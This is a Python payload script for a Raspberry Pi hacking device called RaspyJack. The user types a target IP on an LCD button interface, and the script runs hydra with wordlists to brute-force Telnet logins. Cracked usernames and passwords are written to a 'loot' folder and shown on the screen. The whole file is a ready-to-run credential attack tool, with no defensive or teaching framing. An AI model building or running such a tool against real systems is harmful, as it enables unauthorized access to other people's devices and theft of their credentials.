#!/usr/bin/env python3
"""
RaspyJack *payload* – **Attack: Telnet Brute-Force**
====================================================
A payload that uses `hydra` to perform a dictionary-based brute-force
attack against a Telnet server on the local network.

**NOTE:** This requires `hydra` to be installed and wordlists to be
present on the device.
"""

import os, sys, subprocess, signal, time, threading
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
TARGET_IP = "192.168.1.22" # Default IP, will be configurable
USER_LIST = "/root/Raspyjack/wordlists/telnet_users.txt"
PASS_LIST = "/root/Raspyjack/wordlists/telnet_pass.txt"
LOOT_DIR = "/root/Raspyjack/loot/Bruteforce/"

# --- GPIO & LCD ---
PINS = { "UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16 }
GPIO.setmode(GPIO.BCM)
for pin in PINS.values(): GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)
LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT = ImageFont.load_default()

# --- Globals & Shutdown ---
running = True
attack_thread = None
status_msg = "Press OK to start"
found_creds = ""
current_ip_input = "192.168.1.22" # Initial value for IP input
ip_input_cursor_pos = 0 # Cursor position for IP input
ip_input_segment = 0 # Which segment of the IP (0-3) is being edited

def cleanup(*_):
    global running
    running = False

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# --- UI ---
def draw_ui(screen_state="main"):
    img = Image.new("RGB", (128, 128), "black")
    d = ImageDraw.Draw(img)
    d.text((5, 5), "Telnet Brute-Force", font=FONT_TITLE, fill="#FF0000")
    d.line([(0, 22), (128, 22)], fill="#FF0000", width=1)
    
    if screen_state == "main":
        if found_creds:
            d.text((10, 40), "SUCCESS!", font=FONT_TITLE, fill="lime")
            d.text((10, 60), found_creds, font=FONT, fill="white")
        else:
            d.text((10, 60), status_msg, font=FONT, fill="yellow")
            
        d.text((5, 115), "OK=Start | KEY3=Exit", font=FONT, fill="cyan")
    elif screen_state == "ip_input":
        d.text((5, 30), "Enter Target IP:", font=FONT, fill="white")
        display_ip = list(current_ip_input)
        if ip_input_cursor_pos < len(display_ip):
            display_ip[ip_input_cursor_pos] = '_'
        d.text((5, 50), "".join(display_ip), font=FONT_TITLE, fill="yellow")
        d.text((5, 115), "UP/DOWN=Digit | LEFT/RIGHT=Move | OK=Confirm", font=FONT, fill="cyan")
    
    LCD.LCD_ShowImage(img, 0, 0)

def handle_ip_input():
    global current_ip_input, ip_input_cursor_pos, ip_input_segment
    
    ip_segments = current_ip_input.split('.')
    if len(ip_segments) != 4: # Reset if invalid format
        ip_segments = ["192", "168", "1", "22"]
        current_ip_input = ".".join(ip_segments)
    
    draw_ui("ip_input")
    
    while running:
        btn = None
        for name, pin in PINS.items():
            if GPIO.input(pin) == 0:
                btn = name
                while GPIO.input(pin) == 0: # Debounce
                    time.sleep(0.05)
                break
        
        if btn == "KEY3": # Cancel IP input
            return False
        
        if btn == "OK": # Confirm IP
            # Validate IP format
            parts = current_ip_input.split('.')
            if len(parts) == 4 and all(p.isdigit() and 0 <= int(p) <= 255 for p in parts):
                return True
            else:
                draw_ui("ip_input")
                draw_message("Invalid IP!\nTry again.")
                time.sleep(2)
                current_ip_input = "192.168.1.22" # Reset to default
                ip_input_cursor_pos = 0
                ip_input_segment = 0
                draw_ui("ip_input")
        
        if btn == "LEFT":
            ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
            draw_ui("ip_input")
        elif btn == "RIGHT":
            ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
            draw_ui("ip_input")
        elif btn == "UP" or btn == "DOWN":
            if ip_input_cursor_pos < len(current_ip_input):
                char_list = list(current_ip_input)
                current_char = char_list[ip_input_cursor_pos]
                
                if current_char.isdigit():
                    digit = int(current_char)
                    if btn == "UP":
                        digit = (digit + 1) % 10
                    else: # DOWN
                        digit = (digit - 1 + 10) % 10
                    char_list[ip_input_cursor_pos] = str(digit)
                    current_ip_input = "".join(char_list)
                elif current_char == '.':
                    # Cannot change dot, move cursor
                    if btn == "UP":
                        ip_input_cursor_pos = min(len(current_ip_input), ip_input_cursor_pos + 1)
                    else:
                        ip_input_cursor_pos = max(0, ip_input_cursor_pos - 1)
                draw_ui("ip_input")
        
        time.sleep(0.1)
    return False

# --- Attacker ---
def run_attack(target_ip):
    global status_msg, found_creds
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    output_file = os.path.join(LOOT_DIR, f"telnet_brute_{target_ip}.txt")
    
    status_msg = f"Attacking {target_ip}..."
    
    try:
        command = f"hydra -L {USER_LIST} -P {PASS_LIST} -t 4 -o {output_file} telnet://{target_ip}"
        proc = subprocess.run(command, shell=True, check=True, capture_output=True, text=True, timeout=600)
        
        with open(output_file, "r") as f:
            for line in f:
                if "host:" in line and "login:" in line:
                    parts = line.split()
                    login = parts[parts.index("login:")+1]
                    password = parts[parts.index("password:")+1]
                    found_creds = f"{login}:{password}"
                    return

        status_msg = "No creds found."

    except subprocess.TimeoutExpired:
        status_msg = "Attack timed out!"
    except Exception as e:
        status_msg = "Attack failed!"
        print(f"Hydra attack failed: {e}", file=sys.stderr)

# --- Main Loop ---
try:
    if subprocess.run("which hydra", shell=True, capture_output=True).returncode != 0:
        status_msg = "hydra not found!"
        draw_ui()
        time.sleep(3)
        raise SystemExit("`hydra` command not found.")
    if not (os.path.exists(USER_LIST) and os.path.exists(PASS_LIST)):
        status_msg = "Wordlists not found!"
        draw_ui()
        time.sleep(3)
        raise SystemExit("Wordlists not found.")

    current_screen = "main" # State variable for the main loop

    while running:
        if current_screen == "main":
            draw_ui("main")
            
            if GPIO.input(PINS["KEY3"]) == 0:
                cleanup()
                break
            
            if GPIO.input(PINS["OK"]) == 0:
                # Transition to IP input screen
                current_screen = "ip_input"
                time.sleep(0.3) # Debounce
        
        elif current_screen == "ip_input":
            if handle_ip_input(): # If IP input is confirmed
                TARGET_IP = current_ip_input # Update global TARGET_IP
                if not (attack_thread and attack_thread.is_alive()):
                    found_creds = ""
                    attack_thread = threading.Thread(target=run_attack, args=(TARGET_IP,), daemon=True)
                    attack_thread.start()
                current_screen = "main" # Go back to main screen after starting attack
            else: # If IP input is cancelled
                current_screen = "main"
            time.sleep(0.3) # Debounce

        time.sleep(0.1)

except (KeyboardInterrupt, SystemExit):
    pass
finally:
    cleanup()
    LCD.LCD_Clear()
    GPIO.cleanup()
    print("Telnet Brute-Force payload finished.")
